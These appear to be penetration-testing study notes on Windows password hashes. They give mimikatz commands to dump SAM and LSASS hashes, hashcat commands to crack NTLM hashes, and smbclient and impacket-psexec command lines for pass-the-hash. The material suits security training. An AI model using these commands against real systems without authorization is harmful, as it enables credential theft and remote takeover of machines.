# Password Hashes

## CRAKING METHODOLOGY
1. Extract hashes
2. Format hashes
3. Calculate the cracking time
4. Prepare wordlist
5. Attack the hash
* Identify a hash: hashid HASH
* Cracking: https://hashes.com/en/decrypt/hash https://crackstation.net/
* Hashcat: https://www.kali.org/tools/hashcat/

## Mimikatz
We use mimikatz to dump the SAM hashes. Also to extract the password hash from LSASS

* ⚠️ We must launch mimikatz from an administrative command prompt
* ⚠️ We must execute two commands "privilege::debug" and "token:elevate"

Usage:
* 1.- mimikatz.exe
* 2.- privilege::debug
* 3.- token::elevate
* 4.- lsadump::sam

## Cracking NTLM
* Get-LocalUser -> to check which users exist locally on the system.
* mimikatz.exe
* privilege::debug
* token::elevate
* lsadump::sam
* Save the hash like user.hash
* hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

## Passing the hash
We can use this technique to authenticate to a local or remote target with a valid combination of username and NTLM hash 
rather than a plaintext password.
* mimikatz.exe
* privilege::debug
* token::elevate
* lsadump::sam
* We need some tools to execute the PtH (Pass-The-Hash)
### SMB Enumeration
* smbmap
* smbclient
* crackmapexec
### Command execution
* impacket (psexec, smbexec, wmiexec)
### Example
* smbclient \\\\IP\\folder -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
* impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@IP (It's 32 0's)
